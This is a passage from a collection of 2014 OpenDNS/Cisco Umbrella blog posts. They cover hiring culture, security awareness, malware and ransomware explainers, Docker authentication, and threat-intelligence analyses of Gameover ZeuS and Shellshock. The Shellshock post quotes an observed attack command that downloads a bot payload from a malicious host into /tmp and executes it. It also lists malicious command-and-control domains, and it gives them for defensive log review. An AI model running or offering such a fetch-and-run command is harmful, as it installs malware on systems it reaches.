OpenDNS’s internal slogan is that we enable the world to connect with confidence anywhere and on any device. I truly believe our MSP partners will enable the world to work anywhere with the confidence of having world-class IT support wherever they may roam.", "date": "2014-03-25"},
{"website": "Cisco-Umbrella", "title": "The Difference Between a \"Good Team\" and an \"All-Star Team\"", "author": ["OpenDNS Engineering"], "link": "https://umbrella.cisco.com/blog/difference-team-star-team", "abstract": "All-Star team An intrapreneurial All-Star team, that can respond and execute plans in unison and on target, will let your company recognize and outpace its competitors. “The difference between a [good] team and an [all-star] team is the difference between a million in revenue and a billion in revenue.” – Paul English, Kayak A startling example of this cascading affect by a small but effective team is demonstrated by a pack of wolves that managed to reshape the physical river in Yellowstone National Park in the United States. Watch How Wolves Change Rivers video below. How do you build your own All-Star wolf pack that will help you to bring a disruptive innovation and to reshape your industry? Here are the four points to consider. 1. Rock Star vs All-Star Team Every founder and hiring manager wants to build an All-Star team. But with the day-to-day reality of the growth march, to build one more feature to test the product-market-fit, and with an infrequent supply of All-Star applicants, instead of an All-Star team, it becomes a Rock Star team where one Rock Star hire leads a team of good-enough hires. A team lead by a Rock Star hire will excel initially but will soon produce negative effects of knowledge silos, unchallenged decisions, lack of diverse innovation, and lack of team growth. It is of the utmost importance that you focus on building the best team rather than to just hire the best people. 2. Culture Fit vs Core Value Fit You may hear other companies define culture fit as “someone you can grab a beer with at a bar”. This may create a fun fit culture, but will end up building a homogenous team that will be counter-productive, hamper growth, and limit disruptive and diverse innovation. Companies should measure culture fit with their core values. Core values define the company’s principles to help them dictate their unique culture. At OpenDNS, we have five core values: It’s your ship : Take initiative and take responsibility for your actions. Evangelize greatness : Success comes from a commitment to always improving. Be the strongest link : Support your team’s success by always exceeding expectations. Always be advancing : It’s never enough for our company to hold a position, success comes from always advancing. Raise your hand : Solicit help early and involve others when needed. Core value fit triumphs beer-buddy culture fit. 3. Putting Out the Fire vs Building For the Future An All-Star team not only builds for today but add flexibility to change in near future and thus positions the company to be ready to take advantage of the external opportunities that come along. When a team is not an All-Star team, many architectural decisions will be implemented just to solve a “putting out the fire” requirement. To become competitive, your team not only needs to put out fires, but also build a flexibility and adaptability for any market opportunities that may come along. A smart, intrapreneurial All-Star team will let your company recognize and outpace the competition. Prioritize finding a team that can respond and execute in unison and on target. 4. Mediocrity Enabled vs Removal of 6’s One of the dangerous hires is what’s known as the “6’s”. If you rank your hire from 1 to 10 where 1-5 represents low performers and 9-10 represents high performers, then “6’s” represent mediocracy. “But, “6′s” fly under the radar and do just enough work to get by day-to-day. Even worse, they really irritate the high performers (9-10). Since they don’t want to get exposed, they attract other “6′s” to the company. And before you know it, your team slips from being great to being mediocre. It’s extremely important to remove these people from your team as they can be successful somewhere else.” — Michael Karnjanaprakorn, CEO/Co-founder of Skillshare This 1-10 performance rating applies for each experience class. You can hire a junior or an intern that are high performers in their experience level, and can still build an All-Star team. Get rid of mediocrity and make sure to flush the “6’s” in your hiring process.  At OpenDNS, recruiting and engineering team collaborate closely and we constantly refine our interview process that helps us to find high performers and filter out mediocracy. Always focus on building your All-Star Team with above points and soon your company will reshape your industry and leave your competitors behind. Are you a high performer and want to be part of our All-Star team? Find out what positions are available at OpenDNS career page !", "date": "2014-05-27"},
{"website": "Cisco-Umbrella", "title": "Creating a Culture of Security Awareness", "author": ["Ashley Williams"], "link": "https://umbrella.cisco.com/blog/creating-culture-security-awareness", "abstract": "If you follow cyber security news these days, you’ll find that there’s a lot to keep up on. Threats exist everywhere. Just in 2014 alone, we’ve heard about the Heartbleed vulnerability in OpenSSL , the proliferation of remote-access Trojans (RATs) , and it’s starting to feel as though there is a major data breach at a prominent company somewhere in the world almost daily. As a result, this has led us into a sense of unease when it comes to how our money and information are handled by organizations whom we’ve trusted to keep them safe. Some out there may feel powerless to do anything about it; paying for items with cash only and hiding your money under a mattress seem almost reasonable when you’ve had to change your credit card number three times in one year. This brings us to the world of security practitioners and information security. These people are tasked with ensuring the confidentiality, integrity and availability of data, which we already know is no easy feat. Not only are people who work in this field responsible for the safety of data, but they’re verifying that the clients and applications that may access said data pass security muster as well. This means finding and closing loopholes in local applications, examining past and present network traffic for any anomalies, and having a deep understanding of existing software vulnerabilities and how threat actors may exploit them. While a security practitioner may get excited about this kind of talk, this is where the non-technical of us tend to fade away from the conversation. Cross-site scripting vulnerability ? Yawn. Goto fail ? Yep, you’ve lost me. Unfortunately, our willingness to allow the conversation to shift into the uber-technical leaves the rest of us out, and often without the tools and education needed to protect ourselves, our data, and our company’s data. It’s not a coincidence that most data breaches are a result of human error. However, the thing to keep in mind is that a malicious actor will not discriminate when it comes to raking in all that they can. You may have seen a few headlines recently stating that there is a shortage of security professionals, and the ones that are already in the field know what they’re up against. How do the rest of us, the non-security practitioners, help out, and keep ourselves and our data safe at the same time? The first thing to keep in mind is that security is about awareness and context. Awareness is making sure that you’re entering your banking details on the correct site, and ensuring that site is using HTTPS. Context is asking yourself “is it a good idea for me to click the odd-looking video link in this Facebook post?” We can use these ideas of awareness and context to protect our own data, as well as the data of the company for which we work. In the same way we don’t hand our kids over to the first creepy old man wearing a t-shirt that says “baby-sitter” on it, we shouldn’t be handing our data or the “keys to our kingdom” over to the bad actors. Here are a few things the non-technical folks can do to help our security practitioner brethren: Step up your password game: It is 2014. There is no reason for passwords to be scrawled on post-it notes anymore. There are a number of reputable password managers out there, 1Password and LastPass being two of them, and if you have an account with a service that supports two-factor authentication, turn it on! Gmail has it, as do Facebook and Dropbox, and so does OpenDNS for that matter. Password-lock your screen: This way, nobody walking by your computer while it’s unattended can see any information you don’t want them to see. This will also deter your co-workers/housemates/anybody in close proximity from getting on your computer and changing the desktop wallpaper to an image from My Little Pony. Greet people you don’t know: Are you in an office and see somebody walking around you don’t recognize? Ask them if they need help! If your office is anything like OpenDNS HQ, then that person is likely a new employee, and if this is the case, you’ve just met a new co-worker and made them feel welcome. Good on you! If this isn’t the case though, politely direct that person to your front desk or reception area; don’t allow them to walk around your office space willy-nilly. Know your role: Why is this important? Spear-phishing is a method of gaining access to a company by sending a targeted email to an employee and imploring them to give up sensitive information. In my case, I work in our Customer Success department; therefore, I shouldn’t receive any emails asking me to click a link to review company financials, for example. If I do receive such an email, you’d better believe I’m giving it the side-eye and passing it along to one of our in-house security practitioners for review. Be more discerning: Don’t be afraid to ask questions of people making requests! Our natural inclination, especially in the workplace, is to be as helpful as possible. In some cases, this results in us giving up too much information. Therefore, if you receive a phone call from somebody wanting sensitive information, don’t be afraid to double-check the caller’s name and role and why they need the information they’re asking for. If you’re dealing with maintenance or a repair person, find out what they need access to, and if their visit was previously scheduled. Otherwise, if the situation seems fishy, there’s a good chance it is. Check your assumptions: Don’t assume you or your company won’t be targeted. In this day and age, there is no such thing as being too big or too small to be breached, and while many threat actors have specific reasons for launching attacks on various organizations (espionage, cyber politics, hacktivism, etc), there are some bad actors that will try to take your company’s website down because it’s Tuesday. Don’t make it easy for them. With that in mind, even if you aren’t a security engineer working on the so-called glamorous technical work (or dirty work, depending on how you look at it), there’s room for all of us in this conversation about security awareness, simply because there is too much at stake. As a consumer, do you want to read about yet another data breach at some large organization with whom you’ve done business? As an employee, do you really want to read about your company’s latest breach and be worried about fielding questions from your customers? I didn’t think so. If you’re a security practitioner reading this, we know your job isn’t easy. You have to have eyes on all systems and applications at all times, you have to filter through terabytes of data to find that needle in the digital haystack, and you have the sobering knowledge that there are very real consequences associated with things that go bump in the cyber night. We’re asking that you help us help you. Let the non-technical people know how we can participate in this conversation, and what we can do to make your daunting job less daunting. You can even make it fun for us! Gamification is an option, as is buddying up with your local marketing department to launch an internal campaign on the importance of cyber security awareness. If you’re a non-technical person reading this, ask lots of questions of your technical brethren and really understand what’s at stake. Is it your company’s reputation? If you’re a business owner, is it your own reputation? How does a data breach affect your bottom line? As a consumer, will you need to go out and replace your credit card again for the fourth time this year? As an employee, will a breach at your company result in decreased revenue, and therefore less room for overall growth? In the end, we’re all security practitioners in some way. At the very least, we all need to think like one because we all want the same thing: for our information to be safe and out of the hands of malicious actors. From an organizational standpoint, the health of any business today is going to depend in part upon their security posture and the trust that their customers have in them. This is why creating a culture of security awareness among all parties is so imperative. Nobody wants to be caught with their pants down, especially not in a situation where customers’ trust is broken. Since none of us want that, let’s help each other cultivate that culture by asking questions, being patient with one another and understanding that we’re all in this together.", "date": "2014-07-11"},
{"website": "Cisco-Umbrella", "title": "Gameover ZeuS Switches From P2P to DGA", "author": ["Andrew Hay"], "link": "https://umbrella.cisco.com/blog/gameover-zeus-switches-p2p-dga", "abstract": "Though Operation Tovar succeeded in temporarily cutting communication between Gameover ZeuS (GoZeus) and its command and control infrastructure, it appears now that GoZeus has migrated from using peer-to-peer communications to domain generation algorithms (DGAs). According to research by our friends over at Malcovery , a “new trojan based heavily on the GameOver Zeus binary…was distributed as the attachment to three spam email templates.” In the report, several domains were identified as being the destination of the infected malware’s communications. The most active of the DGAs was one that we at OpenDNS identified on the day it was registered – cfs50p1je5ljdfs3p7n17odtuw[dot]biz . As you can see, the traffic to the domain starts off with a small number of queries (10) on Thursday, July 10 at around 15:00 UTC. A larger jump to 884 queries doesn’t happen until Friday, July 11 at around 6:00 UTC. At peak (on Friday, July 11th at 10:00 UTC) we see a spike of 10,042 queries for cfs50p1je5ljdfs3p7n17odtuw[dot]biz . The domain in question is associated with a number of IP addresses (as seen below) and have a very low TTL. Three of the IP addresses have also been identified by OpenDNS Labs over the past week as being malicious. All of the IP addresses associated with the domain are located within the Ukraine. The name server (NS) associated with the domain is also highly suspicious. The IP range is associated with AS 3462 and is hosted in Taiwan (TW) – quite the distance from the hosting location in the Ukraine. The IP address is also associated with suspicious name servers for a number of Russian (.ru) servers.  A quick scan of some of the other domains hosted by the IP shows a handful of DGAs and Russian (.ru, .su), Kazakhstan (.kz), and Indian (.in) ccTLDs. One last nugget of intel is some of the scoring that OpenDNS assigns to the domain, its associated IPs, and related ASNs. Hopefully this information has helped you better understand the methodologies employed by GoZeus users. Using OpenDNS Investigate , we were able to derive additional intelligence from our global DNS data and shed some additional light on the communication channels. All OpenDNS users are already protected against the identified domains in the Malcovery report. Should you have any additional questions, please do not hesitate to reach out to us. Additional Refernces: http://blog.malcovery.com/blog/breaking-gameover-zeus-returns krebsonsecurity.com/2014/07/crooks-seek-rivival-of-gameover-zeus-botnet/ investigate.opendns.com http://garwarner.blogspot.com/2014/07/new-gameover-zeus-variant-uses-fastflux.html", "date": "2014-07-11"},
{"website": "Cisco-Umbrella", "title": "Trojan? You mean like the Malware?", "author": ["Vinny LaRiza"], "link": "https://umbrella.cisco.com/blog/trojan-mean-like-malware", "abstract": "Welcome back, ladies and gents, to another installment of MalWTF101! Last month, I picked apart what a BotNet is ( here’s a link for convenience ). This week, I’m going to talk about one of the more classic trolls of the malware neighborhood. This particular style of malware has been around since about the 1980s and is still relevant to this day, as the trolls continue to find ways to trick you into downloading and enabling it on your computer. If you guessed “Trojan”, well then you are correct—we’re going to talk about the Trojan. Unless you’ve been living under that rock, you’ve likely heard the story of the Trojan Horse, which is where the name of this malware was pulled from. Essentially, the Greeks built a giant wooden horse as a trophy to the Trojan army for “winning” the war. Little did those arrogant Trojans know, there was a gang of bruisers hanging out inside that giant wooden statue. As you can probably guess, those hidden soldiers eventually broke out and sacked the City of Troy, thus conquering the city, winning the war and eventually having a common type of malware named after the event. Trojan malware? Pretty much the same as it is in the story. A file that looks legit so you think it’s legit but IT’S NOT LEGIT! You allow it to enter your City of Troy (a.k.a. computer) where, once executed, it’s free to vandalize whatever part of your computer it was sent out to vandalize. Everything from crashing your computer, keystroke logging (where everything that you type is recorded), using your webcam to look at your face or other things, controlling your computer remotely, using your computer as a proxy for illegal activities and attacks on other computers so you look responsible, deleting and/or altering files, downloading and installing third-party malware, watching your screen from their computer while you use it, activating that damn blue screen of death, making you sad, making you angry, making you confused, etc. All possible by way of the Trojan. According to the AWGP Trend Reports White Paper for Q1 2014, they state that “Trojans continue to be the most common type of malware, constituting 71.85% of all malware captured during this quarter. PandaLabs’ Collective Intelligence platform found that that almost four out of every five malware infections were caused by Trojans (79.70%).” Trojans come packaged in a lot of different forms of executables as well—they’re not just limited to vbs and exe files, although those seem to be the most prominent. They can also be pdf, mp3, mov, jpg, txt… you get the idea. Basically any type of desirable file can be a trojan, which makes them particularly annoying and shitty. Some good news out of all of this? Umbrella protects against Trojans. Lots of ’em. Zeus, Ramnit, Android/Gumen, Flame, Renos, FakeAV, I really could go on for a long time. We also, once again, provide you with the tools to pinpoint which computer (or computers) on your network are hosting the source of the activity, should you already be infected with one of these things. So that’s what a Trojan is! Make sense? I sure hope so. If not, you could take it one step further and watch that movie Troy . It’s based around that whole Trojan Horse story and includes Brad Pitt as a demigod who runs around, sword in hand, unconvincingly jump stabbing dudes that are like 3 times his size. You could also apply to join the OpenDNS Labs Security Community , which focuses specifically on potentially malicious domains that have been submitted for review (including those related to Trojans) by the community, and in turn helps to protect the millions of OpenDNS users around the world.", "date": "2014-07-24"},
{"website": "Cisco-Umbrella", "title": "SynoLocker: A New Ransomware Targeting Synology Devices", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/synolocker-new-ransomware-targeting-synology-devices", "abstract": "Synology is a Taiwanese company that manufactures popular storage devices that allow file access from the local network as well as over the internet. 2 months ago, Dell Secureworks reported that vulnerabilities in these devices had been exploited to silently install and run CPUMiner – an application to mine virtual currencies on the behalf of compromised users. Last night, owners of Synology devices reported being victim of a new Ransomware named SynoLocker. Synolocker encrypts the files stored on the NAS, and changes the admin web page to one asking for a ransom, to be paid in Bitcoin to a web site only accessible over the Tor network. It shares interesting similarities with Cryptolocker: the payment system but also the choice of encryption algorithms and their related parameters. The malware also disables access the system using SSH and Telnet. Whether the malware exploits a 0day vulnerability in the operating system (DSM) or exploits devices with poor credentials or an outdated system (versions prior to 5.0 have serious known vulnerabilities) is unknown at this time. This critical vulnerability hasn’t been patched by the vendor yet and might also be the attack vector used by this new ransomware. For the time being, owners of Synology devices should make sure that they are not directly reachable from the Internet, for example by configuring firewall rules on their router. In particular, the following ports should not be accessible from the Internet: 5000, 5001, 21, 22, 23, 80 and 443. Also, keeping offline backups is the best, and sometimes the only way, to recover from ransomware.", "date": "2014-08-04"},
{"website": "Cisco-Umbrella", "title": "OpenGraphiti: The open source data visualization engine for busy hackers", "author": ["Thibault Reuille"], "link": "https://umbrella.cisco.com/blog/opengraphiti-open-source-data-visualization-3d-engine-busy-hackers", "abstract": "Here at OpenDNS we have been working on a next-generation data visualization tool. We have been using this tool extensively to provide new insights into, and unique perspectives of, our intelligence database. The project has now reached a certain level of maturity and we are extremely proud to announce OpenGraphiti ! So, what is it ? OpenGraphiti is a new data visualization engine focused on 3D rendering. It can visualize any relational data by connecting various entities with ‘like’ relationships. In addition to the visualization tool, we also provide all of the required tools and libraries to create your own custom datasets. The engine exposes an API, written in C, with wrappers for Python and Javascript. Any data scientist with basic skills in Python can add visualizations to their framework and connect it with their favorite data analysis tools. The API offers the possibility to directly play with the visual representation of the data – making it easier to explore, analyze, and present complex data to a visually inclined audience. How does it work ? When it comes to data visualization, there are multiple approaches to the problem. As the main purpose of the engine is to analyze the topology of any relational dataset, we need to gravitate towards visualization techniques that will let the data drive the layout – and not the other way around. For that kind of visualization, the de facto standard tends to be the use of force-directed layouts. The general concept is relatively simple in that every node is treated as a particle and every edge as a force on the particles. By implementing an engine capable of running a particle physics model we can transform relational data, however loosely related, into a 2D or 3D structure – completely defined by the shape of the relational structure. This relational structure serves to highlight hidden clusters or topological patterns that may have previously gone unnoticed OpenGraphiti is written in C/C++ and takes full advantage of the GPU power using technologies such as OpenGL, GLSL shaders and OpenCL parallel programming library. Most of the geometrical math is calculated with the GLM math library and the python scripts leverage the amazing NetworkX graph library. The project can be compiled with CLang++ for a native binary (Best performances) but also with LLVM compilers like Emscripten to create a Javascript bytecode that can be easily integrated in a web page. Most data visualization tools suffer from latency or performance issues when dealing with large datasets. Our goal is to significantly push the limits by using modern acceleration and parallelization techniques. Everybody can appreciate the evolution of 3D graphic cards just by looking at the last video games : Indeed several hardware companies have invested a lot of efforts in improving the quality and performance of their GPUs and they have become insanely good at 3D rendering. Then why not apply it to data visualization? Where can I get it ? Don’t miss our official release at BlackHat! This will be the chance to discover OpenGraphiti and ask any questions you may have. Andrew Hay and I ( Thibault Reuille) will be presenting on August 6th 2014 in the Jasmine Ballroom from 14:15-15:15 (2:15pm to 3:15pm). The git repository containing all of the OpenGraphiti code and associated tools will be made available before the talk. BlackHat Talk : Unveiling the open source visualization engine for busy hackers", "date": "2014-08-05"},
{"website": "Cisco-Umbrella", "title": "Why I joined OpenDNS and Infrastructure Engineering", "author": ["Levi Junkert"], "link": "https://umbrella.cisco.com/blog/joined-opendns-infrastructure-engineering", "abstract": "In previous roles, I have been responsible for building out large scalable hardware and software infrastructures in both public and private companies. I worked as a Database Engineer at RightNow (acquired by Oracle in 2011), a Firmware Engineer at the Space Science and Engineering Lab at Montana State University and a similar role at Jet Propulsion Labs. I also held two roles at Facebook as a Database Engineer and Systems Engineer. Joining the database team at RightNow was where I picked up a passion for systems automation, database design, and systems engineering. This also coincided with my master thesis research at Montana State.  I started to focus all my energy into big data, which led me to take on a role at Facebook as a Database Engineer. At Facebook, I was privileged to take part in building one of the largest real-time database infrastructures in the world. I worked on a multitude of projects, but the highlights for my tenure were related to being a core engineer for the MySQL Pool Scanner Project and building out the database infrastructure for the Timeline feature. Working on systems at Facebook allowed me to continue my interests in hardware and software automation. Towards the end of my career at Facebook, I started to renew my interest in systems security while working on my on-line radio station, ETN.fm. I was always fascinated by software security growing up, especially growing up with cult classics like Matrix, Hackers and Real Genius. Without much effort at all, it was apparent that OpenDNS was in the forefront of Enterprise Security Research, and I immediately utilized the product on all hosts for ETN.fm. I visited with OpenDNS engineers and spent time with members of the company and was immediately excited. I saw an opportunity to help construct an infrastructure platform that allows OpenDNS engineers and research teams to do what they do best; securing any device, anywhere anytime. I happily accepted a role as a Systems Engineer within Infrastructure Engineering. One of the things I noticed within OpenDNS is the excitement people have coming to work everyday. I asked some of my new peers why they also joined the team and here are some of the responses I received; “I met a few people at meet up about Docker at OpenDNS Vancouver location. They explained some of the technologies they were using and the projects they were working. Not only the work they were doing was interesting and challenging, but everyone seemed really excited to be part of it. That was enough reason for me to want to join OpenDNS. I’ve been here for about 3 weeks now, and it’s been #awesome. There is a lot of stuff to learn and interesting challenges to tackle which makes work quite fun. The work environment is amazing and everything is provided to do your work at the highest level. In summary, if you are not part of this #awesome team, then you should ask yourself what I am waiting for.” — Hesam Ghasemi, Site Reliability Engineer – Infrastructure Engineering “I am passionate about connecting people. When I was first contacted by OpenDNS, I was thrilled. I loved the idea of helping people connect and at the same time providing them with an easy and simple way to protect their Internet access, which was always a challenge throughout the environments I have worked on before. Through the interview process I caught a glimpse of the amazing people I would be working with and was awed by the technical atmosphere that was laid out in front of me. Working on a global network serving millions of users every day is certainly fascinating. I was ultimately hooked when I read about the core values and the workplace environment. It sounded like a perfect match and I couldn’t help but say “I’m in!” — Alvaro Pereira, Network Engineer – Infrastructure Engineering “I’ve worked in a lot of small shops, and most of that time was spent on my own. There were users, of course, but rarely was there someone I could bounce ideas off, or call in for help troubleshooting, or even share a joke with (and of course, vacation was always a challenge). I kept swearing that my next job would have actual *coworkers*. And turns out not only does OpenDNS have coworkers, they’re smart, funny, and generous people. That’s the change part; the challenge comes with the scale. I’ve gone from taking care of one server room to working with data centres in 23 cities around the world. Working with some of the newest technologies to make things work for customers, and inventing some of our own. From routing challenges in Docker to correlating ASN activity, there are a *lot* of things that become possible at this scale that I simply never would have encountered anywhere else. I jumped into the deep end when I took this job, but I’m learning a lot and I’m relishing the challenge. “ — Hugh Brown, Systems Engineer – Infrastructure Engineering With the culture obviously in check, having complicated problems to solve like how to handle 50+ billion DNS queries globally, building high-transactional infrastructure and maintaining an environment that is growing fast, while doing it at Internet scale, were clear reasons to be apart of OpenDNS. In this new role, I am able to bring together my passion for big data, security, and designing a scalable automated global infrastructure. — Levi Junkert", "date": "2014-08-15"},
{"website": "Cisco-Umbrella", "title": "Docker private registry authentication", "author": ["Alex Ianchici"], "link": "https://umbrella.cisco.com/blog/docker-private-registry-authentication", "abstract": "Security is part of everyday life. We lock our doors, protect our banking information with passwords that are usually so complicated that we tend to forget them. Using common sense to secure systems is just good practice. It’s really easy to assume that because a system is internal, there is no need to enable authentication or a secure transport for it, but in our current era of remote workers, that internal network can be quite wide. With that in mind, we spent some time investigating various systems we’re bringing up and this week, we set out with the goal of adding authentication to our private Docker repository. As you may be aware, the Docker registry does not provide a mechanism for authentication so we decided that the easiest solution to this problem would be to add an authentication proxy in front of our image repository. In our case we decided to use Nginx over SSL coupled with an internal authentication API: This solution provided us with a few advantages: allows us to use our internal authentication API can be re-used to provide authentication to other systems can be implemented using a Docker container (we <3 Docker) We put together a simple authentication service and an Nginx container which we made available here ( https://registry.hub.docker.com/u/opendns/ ). Simple basic authentication service As a reference for the Nginx proxy container, we built an authentication API using NodeJS, which made creating a Basic authentication service a breeze. All we need to do is to create a really simple server.js , generate a credentials file using the htpasswd utility and wrap the whole thing in a Docker container which we created with the following Dockerfile : FROM google/nodejs\nADD . /app\nWORKDIR /app\nRUN npm install http-auth\nEXPOSE 8000\nENV NODE_PATH /data/node_modules/\nCMD [\"node\", \"server.js\"] We then deployed and tested our service: ubuntu@trusty-64:/basic-auth# docker build -t opendns/basic-auth-service .\nubuntu@trusty-64:/basic-auth# docker run --name simple-auth opendns/basic-auth-service\nubuntu@trusty-64:/basic-auth# docker inspect --format '{{ .NetworkSettings.IPAddress }}' simple-auth\n172.17.0.40\nubuntu@trusty-64:/basic-auth# curl 172.17.0.40:8000\n401 Unauthorized\nubuntu@trusty-64:/basic-auth# curl -u testuser:testpassword 172.17.0.40:8000\nUser authenticated successfully You can find the full example code for the basic authentication service here and the container available here . Nginx authentication proxy The key component of the Nginx proxy is the configuration: # define an /auth section to send the request to an authentication service\nlocation = /auth {\nproxy_pass {{auth_backend}};\nproxy_pass_request_body off;\nproxy_set_header Content-Length \"\";\nproxy_set_header X-Original-URI $request_uri;\nproxy_set_header X-Docker-Token \"\";\n}\n# use the auth_request directive to redirect all requests to the /auth section above\nlocation / {\nproxy_pass {{backend}};\nauth_request /auth;\nproxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504;\nproxy_buffering off;\n} It uses the http_auth_request module which sends the user using the proxy_pass directive to our simple authentication service which either returns a 200 or a 401. The 401 Authorization response triggers the Docker client to respond with a set of credentials using basic auth. Once the credentials are accepted and the API returns a 200, nginx can send the request through to the private registry. Putting the two containers together: ubuntu@trusty-64:/nginx-auth-proxy# docker run -d --name hello-world hello-world # run a simple web server that prints out “Hello world”\nubuntu@trusty-64:/nginx-auth-proxy# docker inspect --format '{{ .NetworkSettings.IPAddress }}' hello-world\n172.17.0.41\nubuntu@trusty-64:/nginx-auth-proxy# docker run -d -e AUTH_BACKEND=http://172.17.0.40:8000 -e BACKEND=http://172.17.0.41:8081 -p 0.0.0.0:8080:80 nginx-auth\nubuntu@trusty-64:/nginx-auth-proxy# curl 0.0.0.0:8080\n<html>\n<head><title>401 Authorization Required</title></head>\n<body bgcolor=\"white\">\n<center><h1>401 Authorization Required</h1></center>\n<hr><center>nginx/1.6.1</center>\n</body>\n</html>\nubuntu@trusty-64:/nginx-auth-proxy# curl -u testuser:testpassword 0.0.0.0:8080\nHello world The only thing left to add to these containers are SSL certificates and you’re good to go! You can find the code for the Nginx authentication proxy here and the container available here . A few things to note with this solution: using basic auth means that every request will hit the authentication API basic auth means your credentials will be sent in the clear unless you secure your connection with SSL. NOTE: never send basic auth credentials without SSL!!! Also, Docker’s client & registry doesn’t like basic auth over HTTP. access to the private registry will need to be restricted to the authentication proxy Another interesting side effect of this solution is that enabling SSL on the private registry has reduced the amount of time it takes for each pull request as the client initially attempts to connect to port 443 before falling back to port 80 unless the port is specified in the registry URL.", "date": "2014-09-03"},
{"website": "Cisco-Umbrella", "title": "Welcome Tokyo, Our 24th Data center!", "author": ["Bryan Hong"], "link": "https://umbrella.cisco.com/blog/welcome-tokyo-24th-data-center", "abstract": "There are cities and then there are megacities. Tokyo is the largest megacity in the world, with about 13 million people who call it home. As of last week, it’s also the home of OpenDNS’s 24th global data center! This new OpenDNS site in Japan is our 4th in the Asia-Pacific region and further establishes our presence and capacity in the region. Tokyo is the 18th site that I’ve helped to build at OpenDNS. In the early days, it was quite an undertaking to open a new data center. Back then, our team was smaller, responsibilities were more concentrated, and building sites demanded more time and effort. Today, we have six times the number of employees at OpenDNS and the data center deployment effort is spread among specialized teams, which enables us to build faster and more efficiently. Our new Tokyo site is strategically located in a major data center that allows us to join Internet Exchanges like JPNAP. Peering at these points will make the routing path even shorter for OpenDNS users and providers, resulting in faster DNS resolution times for both IPv4 and IPv6. A typical OpenDNS user in Japan may see reductions in latency or round-trip times (RTT) of up to 80ms. We’ve already seen a significant shift in traffic from our Singapore and Hong Kong sites to Tokyo, indicating that many users are already benefiting from this improvement. The increased performance in Japan will strengthen with time as we establish new peering relationships. Stay tuned, our global march continues…", "date": "2014-09-15"},
{"website": "Cisco-Umbrella", "title": "Bash, Shellshock and Security: What You Need To Know", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/bash-shellshock-security-need-know", "abstract": "Quick summary: OpenDNS’s infrastructure and our customers’ deployments are not vulnerable to remote exploits targeting the Bash/Shellshock vulnerability. Additionally, most Umbrella customer deployments will automatically be updated to the latest, patched version of Bash. This blog post contains important support information and we encourage all of our customers to continue reading, below. On Wednesday of this week a Bash vulnerability was disclosed that allows for remote code execution on many Linux, Unix and some Mac OS X operating systems. Nicknamed “Shellshock” by the media, this vulnerability allows bad actors to take complete control of a remote system. The OpenDNS Research team is currently aware of several automated attack campaigns which are already exploiting this vulnerability in the wild. Patches for Bash have been issued over the past several days and it is important that you update your own critical systems . What You Need to Know: Our security, research and engineering teams have been working hard to ensure that you are protected from attacks targeting the Shellshock vulnerability. After a careful analysis, we have determined that OpenDNS’s infrastructure is protected from all known exploits that target the Shellshock vulnerability. No customer deployments are exposed to any currently known Shellshock exploit vectors. As a precaution, Umbrella customers should review our latest support article on OpenDNS’s response to the Bash/Shellshock vulnerability. This support article does not apply to OpenDNS parental controls and/or home DNS users. It is for Umbrella customers only. You can read these articles for additional, general information about Shellshock.", "date": "2014-09-26"},
{"website": "Cisco-Umbrella", "title": "How OpenDNS Labs Sees the BASH Vulnerability", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/opendns-and-bash", "abstract": "There have been many blog posts, tweets, and even a few webinars already scheduled to talk about the massive patch-forcing BASH vulnerability – more commonly known as “Shellshock”. OpenDNS Security Labs thought long and hard about how we would respond and decided that, in the best interest of the security community, we wouldn’t simply rehash what everyone else was saying. Instead, we decided to look at the queries made on our global infrastructure to see what observations could be made. For background on the Shellshock vulnerability we recommend visiting: /2014/09/26/bash-shellshock-security-need-know/ http://www.csoonline.com/article/2688716/vulnerabilities/attacks-against-shellshock-continue-as-updated-patches-hit-the-web.html http://threatpost.com/bash-exploit-reported-first-round-of-patches-incomplete/108550 The Data With the help of numerous sources, including our friends at AlienVault , ThreatStream , and Akamai in addition to individuals such as @lbhuston , @achillean , @dkulshitsky , and @nickschroedl , among others, we were able to compile a list of Shellshock scanning IP addresses. This list, which can be found here , contains 1060 unique IP addresses, at the time this blog post was written, from countries all over the world. As we began to look at the data, a question materialized: how many of these scans were from researchers vs. malicious actors…and how could we find out? To begin with, we looked at the IP addresses from our scan data set and determined the ASN, CIDR, geographic location, and AS owners for each scanner IP. An IP-based geolocation map was generated and can be seen below. Looking at the scanning IP country of origin, the chart shown below represents the top talking countries, by ASN, with more than 10 identified IP-to-ASN mappings. As you can see, the majority of scans originated from France, Germany, The Netherlands, Italy, China, Great Britain, and the United States, in ascending order. For those scanning countries with fewer than 10 scans, there is a much more level count of scans-per-country. Just hours after this vulnerability was reported, Perl Shellbot and bash injected ELF malware was seen in the wild. Aside from researchers scanning the entire Internet (looking at you @achillean and @ErrataRob ), hobbyists, and script kiddies, we observed a huge surge in connections to two IRC servers with hardcoded discovered in several Perl Shellbot samples we (along with others) found on Pastebin.com . These IRC servers, us[.]bot[.]nu and fbi[.]bot[.]nu, are profiled below, as is another malicious payload downloader site. Analysis – us[.]bot[.]nu Between September 25th, 2014 and October 2nd, 2014 we observed more than 3.2 million queries for this domain on our infrastructure, with the highest peak (602,295) occurring on September 27th at 01:00 UTC. Analysis – fbi[.]bot[.]nu Between September 25th, 2014 and October 2nd, 2014 we observed more than 2.5 million queries for this domain, with the highest peak (410,651) occurring on September 27th at 01:00 UTC. Analysis – Stablehost[.]us A third domain has also been observed as a payload delivery downloader site after the Shellshock vulnerability is detected. This site, stablehost[.]us was known to, and blocked by, OpenDNS back in January, 2014 as it had been used to deliver the Fiesta exploit kit – and now appears to be repurposed for payload delivery. The following string was observed by numerous researchers and security professionals across various perimeter security controls. The command is essentially fetching and running another payload as part of its post-exploitation campaign: /bin/bash -c ”wget http://stablehost[.]us/bots/regular.bot -O /tmp/sh;curl -o /tmp/sh http://stablehost.us/bots/regular.bot ; sh /tmp/sh;rm -rf /tmp/sh Based on the sustained 1K query count, this is likely a string you should start reviewing your logs for. Further Analysis With all of that data, can we differentiate between researchers, script kiddies, and bots? The first two (researchers and script kiddies) are by far the most difficult to differentiate between <pause for laughter>. Let’s look at more findings and see… Looking at day over day changes in activities between users who had been probing for the vulnerability on September 29th vs the 30th, there 118 more users on the 30th than on the 29th. Despite this sudden uptick in users what was more interesting was traffic patterns between the two groups. More than 90% of the new Shellshock probers visited less than three suspicious websites. However, individuals on the 29th who had visited malware continued to visit malware on the same rate on the 30th. In fact, the malware rates and sites visited were almost identical with a deviation of +/- 2. One 